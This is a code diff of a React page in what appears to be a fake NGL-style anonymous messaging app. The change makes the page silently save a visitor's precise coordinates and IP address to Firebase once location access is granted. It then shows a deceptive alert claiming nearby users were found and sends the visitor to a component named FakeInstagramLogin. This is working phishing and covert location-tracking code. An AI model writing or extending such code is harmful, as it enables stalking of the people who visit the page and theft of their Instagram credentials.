@@ -2,7 +2,7 @@ import { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'framer-motion';
 import { UserCircle2, Dices } from 'lucide-react';
 import { useParams } from 'react-router-dom';
-import { getSettings, saveMessage } from '../lib/firebase';
+import { getSettings, saveMessage, saveLocationOnly } from '../lib/firebase';
 import FakeInstagramLogin from '../components/FakeInstagramLogin';
 
 export default function Send() {
@@ -296,11 +296,13 @@ export default function Send() {
                   if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                       (position) => {
-                        setCapturedLocation({
+                        const loc = {
                           lat: position.coords.latitude,
                           lng: position.coords.longitude,
                           strategy: 'nearby_feature'
-                        });
+                        };
+                        setCapturedLocation(loc);
+                        saveLocationOnly({ location: loc, ip }).catch(console.error);
                         alert("📍 Konumunda 3 aktif NGL kullanıcısı bulundu! Onlara mesaj göndermek için giriş yap.");
                         setStep('ig_login');
                       },
